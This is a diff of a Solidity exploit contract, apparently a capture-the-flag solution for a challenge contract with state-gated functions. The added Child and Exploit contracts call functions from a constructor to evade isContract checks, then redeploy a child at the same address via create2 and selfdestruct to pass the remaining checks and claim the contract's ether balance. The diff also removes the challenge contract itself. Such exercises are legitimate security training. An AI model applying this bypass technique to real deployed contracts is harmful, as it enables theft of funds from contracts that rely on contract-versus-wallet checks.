@@ -9,6 +9,13 @@ interface ICalled {
 }
 
 interface IChallenge_teryanarmen {
+    enum State {
+        THREE,
+        TWO,
+        ONE,
+        ZERO
+    }
+
     function first() external;
 
     function second() external;
@@ -18,91 +25,77 @@ interface IChallenge_teryanarmen {
     function fourth() external;
 
     function winner() external view returns (address);
+
+    function state() external view returns (State);
+}
+
+contract Child {
+    IChallenge_teryanarmen instance;
+
+    constructor(IChallenge_teryanarmen _instance) {
+        instance = _instance;
+
+        if (instance.state() == IChallenge_teryanarmen.State.THREE) {
+            console.log("third");
+            instance.third();
+        } else if (instance.state() == IChallenge_teryanarmen.State.ONE) {
+            console.log("first");
+            instance.first();
+        }
+    }
+
+    function finalize() external {
+        if (instance.state() == IChallenge_teryanarmen.State.TWO) {
+            console.log("second");
+            instance.second();
+        } else if (instance.state() == IChallenge_teryanarmen.State.ZERO) {
+            console.log("fourth");
+            instance.fourth();
+        }
+    }
+
+    function sup() external view returns (uint256) {
+        if (instance.state() == IChallenge_teryanarmen.State.TWO) {
+            return 1337;
+        } else if (instance.state() == IChallenge_teryanarmen.State.ZERO) {
+            return 80085;
+        }
+        return 0;
+    }
+
+    function destroy() external {
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {}
 }
 
 contract Exploit_teryanarmen {
     IChallenge_teryanarmen instance;
-
-    uint256 public sup = 1337;
+    Child child;
 
     constructor(IChallenge_teryanarmen _instance) payable {
         instance = _instance;
-
-        instance.third();
-        // Exploit_teryanarmen_Third third = new Exploit_teryanarmen_Third(instance);
-
-        // instance.second();
     }
 
     function finalize() external payable {
-        instance.second();
-        instance.first();
-        // instance.first();
-        // sup = 80085;
-        // instance.fourth();
-
-        selfdestruct(payable(address(this)));
+        deployChild();
+        child.finalize();
+        child.destroy();
     }
 
-    // receive() external payable {}
-}
+    function deployChild() public {
+        bytes memory bytecode = abi.encodePacked(type(Child).creationCode, abi.encode(address(instance)));
 
-contract Exploit_teryanarmen_Third {
-    constructor(IChallenge_teryanarmen _instance) {
-        _instance.third();
-    }
-}
+        address addr;
+        assembly {
+            addr := create2(0, add(bytecode, 0x20), mload(bytecode), 0)
 
-contract Challenge2 {
-    using Address for address;
+            if iszero(extcodesize(addr)) {
+                revert(0, 0)
+            }
+        }
 
-    State public state;
-    address public winner;
-
-    modifier onlyWinner() {
-        require(msg.sender == winner, "oops");
-        _;
-    }
-    modifier onlyState(State _state) {
-        require(state == _state, "no...");
-        _;
-    }
-    modifier onlyContract() {
-        require(Address.isContract(msg.sender), "try again");
-        _;
-    }
-    modifier onlyNotContract() {
-        require(!Address.isContract(msg.sender), "yeah, no");
-        _;
-    }
-
-    enum State {
-        THREE,
-        TWO,
-        ONE,
-        ZERO
-    }
-
-    constructor() payable {
-        require(msg.value == 1 ether, "cheap");
-    }
-
-    function first() public onlyWinner onlyNotContract onlyState(State.ONE) {
-        state = State.ZERO;
-    }
-
-    function second() public onlyWinner onlyContract onlyState(State.TWO) {
-        require(ICalled(msg.sender).sup() == 1337, "not leet");
-        state = State.ONE;
-    }
-
-    function third() public onlyNotContract onlyState(State.THREE) {
-        winner = msg.sender;
-        state = State.TWO;
-    }
-
-    function fourth() public onlyWinner onlyContract onlyState(State.ZERO) {
-        require(ICalled(msg.sender).sup() == 80085, "not boobs");
-        payable(msg.sender).transfer(address(this).balance);
+        child = Child(payable(addr));
     }
 }
